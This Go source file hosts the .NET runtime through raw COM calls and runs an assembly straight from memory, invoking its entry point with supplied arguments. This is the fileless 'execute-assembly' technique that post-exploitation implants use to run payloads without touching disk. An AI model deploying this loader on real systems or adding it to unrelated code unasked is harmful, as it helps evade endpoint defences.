//go:build windows

package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

var (
	mscoree    = syscall.NewLazyDLL("mscoree.dll")
	pCLRCreate = mscoree.NewProc("CLRCreateInstance")
)

// CLR GUIDs
var (
	CLSID_CLRMetaHost = GUID{0x9280188d, 0x0e8e, 0x4867, [8]byte{0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
	IID_ICLRMetaHost  = GUID{0xd332db9e, 0xb9b3, 0x4125, [8]byte{0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16}}
	IID_ICLRRuntimeInfo = GUID{0xbd39d1d2, 0xba2f, 0x486a, [8]byte{0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91}}
	CLSID_CLRRuntimeHost = GUID{0x90f1a06e, 0x7712, 0x4762, [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
	IID_ICLRRuntimeHost = GUID{0x90f1a06c, 0x7712, 0x4762, [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
	IID_ICorRuntimeHost = GUID{0xcb2f6722, 0xab3a, 0x11d2, [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}
	CLSID_CorRuntimeHost = GUID{0xcb2f6723, 0xab3a, 0x11d2, [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}
)

type GUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

type iCLRMetaHostVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	GetRuntime     uintptr
	GetVersionFromFile uintptr
	EnumerateInstalledRuntimes uintptr
	EnumerateLoadedRuntimes uintptr
	RequestRuntimeLoadedNotification uintptr
	QueryLegacyV2RuntimeBinding uintptr
	ExitProcess    uintptr
}

type iCLRMetaHost struct {
	vtbl *iCLRMetaHostVtbl
}

type iCLRRuntimeInfoVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	GetVersionString uintptr
	GetRuntimeDirectory uintptr
	IsLoaded       uintptr
	LoadErrorString uintptr
	LoadLibrary    uintptr
	GetProcAddress uintptr
	GetInterface   uintptr
	IsLoadable     uintptr
	SetDefaultStartupFlags uintptr
	GetDefaultStartupFlags uintptr
	BindAsLegacyV2Runtime uintptr
	IsStarted      uintptr
}

type iCLRRuntimeInfo struct {
	vtbl *iCLRRuntimeInfoVtbl
}

type iCorRuntimeHostVtbl struct {
	QueryInterface           uintptr
	AddRef                   uintptr
	Release                  uintptr
	CreateLogicalThreadState uintptr
	DeleteLogicalThreadState uintptr
	SwitchInLogicalThreadState uintptr
	SwitchOutLogicalThreadState uintptr
	LocksHeldByLogicalThread uintptr
	MapFile                  uintptr
	GetConfiguration         uintptr
	Start                    uintptr
	Stop                     uintptr
	CreateDomain             uintptr
	GetDefaultDomain         uintptr
	EnumDomains              uintptr
	NextDomain               uintptr
	CloseEnum                uintptr
	CreateDomainEx           uintptr
	CreateDomainSetup        uintptr
	CreateEvidence           uintptr
	UnloadDomain             uintptr
	CurrentDomain            uintptr
}

type iCorRuntimeHost struct {
	vtbl *iCorRuntimeHostVtbl
}

func executeAssembly(data []byte, args string) string {
	if len(data) == 0 {
		return "Error: empty assembly data"
	}

	var metaHost *iCLRMetaHost
	hr, _, _ := pCLRCreate.Call(
		uintptr(unsafe.Pointer(&CLSID_CLRMetaHost)),
		uintptr(unsafe.Pointer(&IID_ICLRMetaHost)),
		uintptr(unsafe.Pointer(&metaHost)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: CLRCreateInstance failed (0x%08x)", hr)
	}

	runtimeVersion, _ := syscall.UTF16PtrFromString("v4.0.30319")
	var runtimeInfo *iCLRRuntimeInfo
	hr, _, _ = syscall.SyscallN(
		metaHost.vtbl.GetRuntime,
		uintptr(unsafe.Pointer(metaHost)),
		uintptr(unsafe.Pointer(runtimeVersion)),
		uintptr(unsafe.Pointer(&IID_ICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&runtimeInfo)),
	)
	if hr != 0 {
		runtimeVersion, _ = syscall.UTF16PtrFromString("v2.0.50727")
		hr, _, _ = syscall.SyscallN(
			metaHost.vtbl.GetRuntime,
			uintptr(unsafe.Pointer(metaHost)),
			uintptr(unsafe.Pointer(runtimeVersion)),
			uintptr(unsafe.Pointer(&IID_ICLRRuntimeInfo)),
			uintptr(unsafe.Pointer(&runtimeInfo)),
		)
		if hr != 0 {
			return fmt.Sprintf("Error: GetRuntime failed (0x%08x)", hr)
		}
	}

	var runtimeHost *iCorRuntimeHost
	hr, _, _ = syscall.SyscallN(
		runtimeInfo.vtbl.GetInterface,
		uintptr(unsafe.Pointer(runtimeInfo)),
		uintptr(unsafe.Pointer(&CLSID_CorRuntimeHost)),
		uintptr(unsafe.Pointer(&IID_ICorRuntimeHost)),
		uintptr(unsafe.Pointer(&runtimeHost)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: GetInterface failed (0x%08x)", hr)
	}

	hr, _, _ = syscall.SyscallN(runtimeHost.vtbl.Start, uintptr(unsafe.Pointer(runtimeHost)))
	if hr != 0 && hr != 1 { // S_FALSE (1) means already started
		return fmt.Sprintf("Error: CLR Start failed (0x%08x)", hr)
	}

	var appDomainIUnk uintptr
	hr, _, _ = syscall.SyscallN(
		runtimeHost.vtbl.GetDefaultDomain,
		uintptr(unsafe.Pointer(runtimeHost)),
		uintptr(unsafe.Pointer(&appDomainIUnk)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: GetDefaultDomain failed (0x%08x)", hr)
	}

	// QI for _AppDomain
	IID_AppDomain := GUID{0x05f696dc, 0x2b29, 0x3663, [8]byte{0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}}
	var appDomain uintptr
	hr, _, _ = syscall.SyscallN(
		*(*uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(appDomainIUnk)))), // QueryInterface
		appDomainIUnk,
		uintptr(unsafe.Pointer(&IID_AppDomain)),
		uintptr(unsafe.Pointer(&appDomain)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: QI _AppDomain failed (0x%08x)", hr)
	}

	safeArray := createSafeArrayFromBytes(data)
	if safeArray == 0 {
		return "Error: failed to create SafeArray for assembly"
	}

	// _AppDomain.Load_3(safeArray) -> _Assembly
	appDomainVtbl := *(*uintptr)(unsafe.Pointer(appDomain))
	// Load_3 is at vtbl offset 44 (11th method from IDispatch base at index 7+37=44 on x64)
	loadOffset := uintptr(44 * unsafe.Sizeof(uintptr(0)))
	var assembly uintptr
	hr, _, _ = syscall.SyscallN(
		*(*uintptr)(unsafe.Pointer(appDomainVtbl + loadOffset)),
		appDomain,
		safeArray,
		uintptr(unsafe.Pointer(&assembly)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: AppDomain.Load failed (0x%08x)", hr)
	}

	// _Assembly.get_EntryPoint -> MethodInfo
	assemblyVtbl := *(*uintptr)(unsafe.Pointer(assembly))
	getEntryPointOffset := uintptr(14 * unsafe.Sizeof(uintptr(0)))
	var entryPointMethod uintptr
	hr, _, _ = syscall.SyscallN(
		*(*uintptr)(unsafe.Pointer(assemblyVtbl + getEntryPointOffset)),
		assembly,
		uintptr(unsafe.Pointer(&entryPointMethod)),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: get_EntryPoint failed (0x%08x)", hr)
	}

	var argArray uintptr
	if args != "" {
		argParts := strings.Fields(args)
		argArray = createSafeArrayOfStrings(argParts)
	} else {
		argArray = createEmptySafeArrayOfStrings()
	}

	// Wrap argArray in a VARIANT, then in a 1-element SafeArray of VARIANT
	paramArray := createInvokeParams(argArray)

	// MethodInfo.Invoke_3(obj=null, params)
	methodVtbl := *(*uintptr)(unsafe.Pointer(entryPointMethod))
	invokeOffset := uintptr(26 * unsafe.Sizeof(uintptr(0)))
	var retVal [24]byte // VARIANT
	hr, _, _ = syscall.SyscallN(
		*(*uintptr)(unsafe.Pointer(methodVtbl + invokeOffset)),
		entryPointMethod,
		0,          // null object (static Main)
		paramArray, // SafeArray of VARIANT
		uintptr(unsafe.Pointer(&retVal[0])),
	)
	if hr != 0 {
		return fmt.Sprintf("Error: Invoke failed (0x%08x)", hr)
	}

	return "Assembly executed"
}

// OLE Automation helpers

var (
	oleaut32           = syscall.NewLazyDLL("oleaut32.dll")
	pSafeArrayCreate   = oleaut32.NewProc("SafeArrayCreate")
	pSafeArrayPutElement = oleaut32.NewProc("SafeArrayPutElement")
	pSafeArrayAccessData = oleaut32.NewProc("SafeArrayAccessData")
	pSafeArrayUnaccessData = oleaut32.NewProc("SafeArrayUnaccessData")
	pSysAllocString    = oleaut32.NewProc("SysAllocString")
)

type safeArrayBound struct {
	Elements uint32
	LBound   int32
}

func createSafeArrayFromBytes(data []byte) uintptr {
	bound := safeArrayBound{Elements: uint32(len(data)), LBound: 0}
	sa, _, _ := pSafeArrayCreate.Call(
		17, // VT_UI1
		1,
		uintptr(unsafe.Pointer(&bound)),
	)
	if sa == 0 {
		return 0
	}

	var pData uintptr
	hr, _, _ := pSafeArrayAccessData.Call(sa, uintptr(unsafe.Pointer(&pData)))
	if hr != 0 {
		return 0
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(pData)), len(data)), data)
	pSafeArrayUnaccessData.Call(sa)
	return sa
}

func createSafeArrayOfStrings(strs []string) uintptr {
	bound := safeArrayBound{Elements: uint32(len(strs)), LBound: 0}
	sa, _, _ := pSafeArrayCreate.Call(
		8, // VT_BSTR
		1,
		uintptr(unsafe.Pointer(&bound)),
	)
	if sa == 0 {
		return 0
	}
	for i, s := range strs {
		wstr, _ := syscall.UTF16PtrFromString(s)
		bstr, _, _ := pSysAllocString.Call(uintptr(unsafe.Pointer(wstr)))
		idx := int32(i)
		pSafeArrayPutElement.Call(sa, uintptr(unsafe.Pointer(&idx)), bstr)
	}
	return sa
}

func createEmptySafeArrayOfStrings() uintptr {
	bound := safeArrayBound{Elements: 0, LBound: 0}
	sa, _, _ := pSafeArrayCreate.Call(8, 1, uintptr(unsafe.Pointer(&bound)))
	return sa
}

func createInvokeParams(stringArraySA uintptr) uintptr {
	// VARIANT: VT_ARRAY | VT_BSTR (0x2008), data = stringArraySA
	var variant [24]byte
	*(*uint16)(unsafe.Pointer(&variant[0])) = 0x2008 // vt
	*(*uintptr)(unsafe.Pointer(&variant[8])) = stringArraySA

	bound := safeArrayBound{Elements: 1, LBound: 0}
	sa, _, _ := pSafeArrayCreate.Call(
		12, // VT_VARIANT
		1,
		uintptr(unsafe.Pointer(&bound)),
	)
	if sa == 0 {
		return 0
	}

	idx := int32(0)
	pSafeArrayPutElement.Call(sa, uintptr(unsafe.Pointer(&idx)), uintptr(unsafe.Pointer(&variant[0])))
	return sa
}
